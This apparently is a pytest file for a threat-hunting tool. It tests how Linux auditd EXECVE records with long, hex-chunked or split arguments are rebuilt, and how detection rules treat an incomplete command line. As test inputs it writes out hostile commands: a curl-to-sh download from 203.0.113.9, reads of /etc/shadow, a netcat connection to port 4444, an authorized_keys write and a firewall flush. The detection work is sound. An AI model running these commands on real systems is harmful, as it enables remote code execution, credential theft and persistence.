"""Long EXECVE arguments: auditd splits an argument it cannot log whole into `aN_len=` plus `aN[0]=`, `aN[1]=`
chunks, possibly across several EXECVE records of one event.

Kernel semantics (kernel/auditsc.c, audit_log_execve_info): an argument has one encoding. It is hex whenever it
spans the copy buffer or holds spaces, quotes or control characters, and quoted otherwise. `aN_len` is the logged
length: hex characters for a hex argument (twice its bytes), bytes for a quoted one.

The parser must rebuild every argument exactly. When chunks, arguments or records are missing it keeps what
arrived before the first gap (a split argument only up to its gap), flags the command line incomplete, and the
sweep marks process rules partial. It never drops the exec, and never presents a shorter command line as whole.
"""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect.base import INCOMPLETE_ARGV_NOTE, ContextAnchor, ContextLink
from romulus.detect.context import PostAccessDiscovery, PrivilegeProbing, StagingAndTransfer
from romulus.detect.host import (
    AuthorizedKeysWrite,
    CredentialStoreRead,
    DownloadPipedToShell,
    FirewallRuleChange,
)
from romulus.evidence.auditd import execve_argv, parse_record
from romulus.evidence.normalize import normalize_hits
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.hunt import sweep as sw
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

HEAD = "type=EXECVE msg=audit(1731940424.829:9001): "
SYSCALL = ('type=SYSCALL msg=audit(1731940424.829:9001): arch=c000003e syscall=59 success=yes exit=0 ppid=10 '
           'pid=11 auid=1000 uid=1000 euid=1000 comm="bash" exe="/usr/bin/bash" key=(null)')
# A shell payload over the kernel's 7.5 KB copy buffer, with spaces: logged as hex chunks.
LONG = "curl -s http://203.0.113.9/x | sh; " * 220
CHUNK_HEX = 7000                      # hex characters per chunk, as the kernel sizes them to fit a record


def _hex(text: str) -> str:
    return text.encode().hex().upper()


def _chunks(index: int, text: str, size: int = CHUNK_HEX) -> list[str]:
    """Kernel-shaped split of a hex argument: aN_len is the hex character count."""
    encoded = _hex(text)
    parts = [encoded[i:i + size] for i in range(0, len(encoded), size)]
    return [f"a{index}_len={len(encoded)}"] + [f"a{index}[{n}]={p}" for n, p in enumerate(parts)]


def _argv(body: str):
    return execve_argv(parse_record(HEAD + body))


# ---- complete command lines ----------------------------------------------------------------------------

def test_a_long_hex_argument_is_rebuilt_and_its_length_is_counted_in_hex_characters():
    body = " ".join(["argc=3", 'a0="bash"', 'a1="-c"', *_chunks(2, LONG)])
    assert len(LONG) > 7500 and _argv(body) == (["bash", "-c", LONG], None)


def test_a_quoted_split_argument_states_its_length_in_bytes():
    body = 'argc=2 a0="echo" a1_len=6 a1[0]="abc" a1[1]="def"'
    assert _argv(body) == (["echo", "abcdef"], None)


def test_chunk_order_follows_the_index_not_the_record_order():
    body = "argc=2 a0=\"echo\" a1_len=12 a1[1]=" + _hex("def") + " a1[0]=" + _hex("abc")
    assert _argv(body) == (["echo", "abcdef"], None)


# ---- incomplete command lines: the prefix that arrived, never spliced, and the reason --------------------

@pytest.mark.parametrize("body,prefix,why", [
    ("argc=2 a0=\"echo\" a1_len=18 a1[0]=" + _hex("abc") + " a1[2]=" + _hex("ghi"), ["echo", "abc"], "chunk 1 missing"),
    ("argc=2 a0=\"echo\" a1_len=18 a1[0]=" + _hex("abc") + " a1[1]=" + _hex("def"), ["echo", "abcdef"],
     "hold 12 of a1_len=18"),
    ("argc=2 a0=\"echo\" a1_len=6 a1[1]=" + _hex("def"), ["echo"], "first chunk missing"),
    ("argc=2 a0=\"echo\" a1_len=18", ["echo"], "a1 missing"),
    ("argc=2 a0=\"echo\" a1_len=x a1[0]=" + _hex("abc"), ["echo", "abc"], "a1_len missing or not a number"),
    ("argc=2 a0=\"echo\" a1[0]=" + _hex("abc"), ["echo", "abc"], "a1_len missing or not a number"),
    ("argc=2 a0=\"echo\" a1_len=3 a1[0]=" + _hex("abc"), ["echo", "abc"], "hold 6 of a1_len=3"),   # a byte count
    ("argc=2 a0=\"echo\" a1=\"x\" a1_len=6 a1[0]=" + _hex("abc"), ["echo"], "both whole and split"),
    ("argc=2 a0=\"echo\" a1_len=3 a1[0]=ZZZ", ["echo"], "not hex"),
    ("argc=2 a0=\"echo\" a1_len=9 a1[0]=\"abc\" a1[1]=" + _hex("def"), ["echo"], "mix quoted and hex"),
    ("argc=3 a0=\"echo\" a1=\"x\"", ["echo", "x"], "a2 missing (argc=3)"),
    ("argc=2 a0=\"echo\" a1=\"x\" a2=\"y\"", ["echo", "x"], "a2 lies beyond argc=2"),
    ("a0=\"echo\" a1=\"x\"", ["echo", "x"], "argc missing"),
])
def test_an_incomplete_argv_keeps_the_prefix_and_says_why(body, prefix, why):
    args, problem = _argv(body)
    assert args == prefix and problem and why in problem


def _hit(n: int, raw: str) -> dict:
    return {"_id": f"r{n}", "_index": "romulus-host-x", "_source": {
        "@timestamp": "2024-11-18T14:33:44.829Z", "message": raw, "host": {"name": "video"},
        "event": {"dataset": "linux.audit", "original": raw}}}


def _split_event(*, drop: str | None = None) -> list[dict]:
    chunks = _chunks(2, LONG)
    first = HEAD + " ".join(["argc=3", 'a0="bash"', 'a1="-c"', *chunks[:2]])
    rest = HEAD + " ".join(chunks[2:])
    raws = {"first": first, "rest": rest, "syscall": SYSCALL}
    return [_hit(n, raw) for n, (name, raw) in enumerate(raws.items()) if name != drop]


def test_an_argument_split_across_two_execve_records_is_merged_and_matched():
    events, _skips, errors = normalize_hits(_split_event())
    assert errors == [] and [e.get("process.argv") for e in events] == [["bash", "-c", LONG]]
    assert events[0].get("process.argv_complete") is None
    matches = DownloadPipedToShell().consume(events)
    assert len(matches) == 1 and INCOMPLETE_ARGV_NOTE not in matches[0].claim


def test_a_lost_continuation_record_keeps_the_exec_and_its_prefix_positive(monkeypatch):
    hits = _split_event(drop="rest")
    events, _skips, errors = normalize_hits(hits)
    assert len(events) == 1 and len(errors) == 1 and errors[0][1].startswith("linux.audit: command line incomplete")
    event = events[0]
    argv = event.get("process.argv")
    assert argv[:2] == ["bash", "-c"] and LONG.startswith(argv[2]) and len(argv[2]) < len(LONG)
    assert event.get("process.argv_complete") is False
    assert event.get("process.executable") == "/usr/bin/bash" and event.outcome == Outcome.success
    assert any(c.startswith("command line incomplete") for c in event.caveats)

    start = datetime(2024, 11, 18, 14, 30, tzinfo=UTC)
    window = Window(start=start, end=start + timedelta(minutes=5))
    now = datetime.now(UTC)
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: SearchOutcome(
        target=intent.target, fingerprint="f", started_at=now, ended_at=now, completeness=Completeness.complete,
        total=len(hits), total_relation="eq", returned=len(hits), records=hits))
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": ["romulus-host-x"]}, "d", "t")
    sweep = sw.Sweep(repo, None, "h1", window, {"romulus-host-x": None})
    sweep.run_partition("romulus-host-x", None, [], window, est=len(hits))
    cells = {c["rule_id"]: c for c in repo.rule_cells("h1")}
    assert cells["host.download_piped_to_shell"]["state"] == "match_on_partial"
    found = [c for c in repo.candidates("h1") if c["rule_id"] == "host.download_piped_to_shell"]
    assert len(found) == 1 and INCOMPLETE_ARGV_NOTE in found[0]["claim"]
    assert any(r.startswith("normalization_errors=1 in linux.audit")
               for r in cells["host.download_piped_to_shell"]["detail"]["reasons"])
    assert cells["host.firewall_rule_change_command"]["state"] != "positive_only"
    assert sweep.partial_reasons


def test_a_lost_head_record_still_yields_the_exec_with_an_empty_incomplete_argv():
    events, _skips, errors = normalize_hits(_split_event(drop="first"))
    assert len(events) == 1 and errors
    event = events[0]
    assert event.get("process.argv") == [] and event.get("process.argv_complete") is False
    assert event.get("process.executable") == "/usr/bin/bash" and event.get("process.ppid") == 10


# ---- rules on an incomplete argv: presence predicates use the prefix, absence predicates do not decide ---

def _exec(argv, *, complete=True, cwd=None, event_id="e1"):
    fields = {"process.executable": fv(f"/usr/bin/{argv[0]}", f"{event_id}:exe"),
              "process.argv": fv(argv, f"{event_id}:argv"), "process.session_id": fv(42, f"{event_id}:ses"),
              "process.uid": fv("1000", f"{event_id}:uid"), "process.euid": fv("1000", f"{event_id}:euid")}
    if not complete:
        fields["process.argv_complete"] = fv(False, f"{event_id}:argv")
    if cwd:
        fields["process.cwd"] = fv(cwd, f"{event_id}:cwd")
    return TypedEvent(id=event_id, family="process_exec", ts=datetime(2024, 11, 18, 14, tzinfo=UTC), host="web1",
                      outcome=Outcome.success, fields=fields,
                      raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def _anchor():
    return ContextAnchor(id="F-anchor", anchor_class="web_shell", lane="urgent", claim="a shell",
                         events=[_exec(["sh"], event_id="anchor-event")])


def _link():
    return ContextLink(id="L-session", link_type="login_session", strength="observed",
                       key={"host": "web1", "process.session_id": 42},
                       evidence_events=[_exec(["sshd"], event_id="link-event")], status="complete")


def test_a_presence_rule_matches_the_prefix_and_its_claim_says_the_argv_is_incomplete():
    rule = CredentialStoreRead()
    matches = rule.consume([_exec(["cat", "/etc/shadow"], complete=False)])
    assert len(matches) == 1 and INCOMPLETE_ARGV_NOTE in matches[0].claim and rule.missing_required == 1


def test_a_last_operand_predicate_does_not_decide_on_an_incomplete_argv():
    rule = AuthorizedKeysWrite()
    assert rule.consume([_exec(["cp", "key.pub", "/root/.ssh/authorized_keys"], complete=False)]) == []
    assert rule.missing_required == 1
    assert len(AuthorizedKeysWrite().consume([_exec(["cp", "key.pub", "/root/.ssh/authorized_keys"])])) == 1


def test_a_rule_not_marked_prefix_safe_counts_an_incomplete_argv_as_missing():
    rule = FirewallRuleChange()
    rule.consume([_exec(["iptables", "-F"], complete=False)])
    assert rule.missing_required == 1 and rule.evaluated == 0


@pytest.mark.parametrize("rule_cls,argv", [
    (PostAccessDiscovery, ["ifconfig"]),            # discovery only while no change verb follows
    (PostAccessDiscovery, ["find", "/home"]),       # file discovery only while no -perm setuid test follows
    (StagingAndTransfer, ["base64", "/etc/shadow"]),  # encoding only while no -d follows
    (StagingAndTransfer, ["nc", "203.0.113.9", "4444"]),  # outbound only while no -l follows
    (PrivilegeProbing, ["sudo", "-l"]),
])
def test_an_absence_predicate_does_not_match_on_an_incomplete_argv(rule_cls, argv):
    complete = rule_cls()
    assert len(complete.consume_linked(_anchor(), _link(), [_exec(argv)])) == 1
    partial = rule_cls()
    assert partial.consume_linked(_anchor(), _link(), [_exec(argv, complete=False)]) == []
    assert partial.missing_required == 1
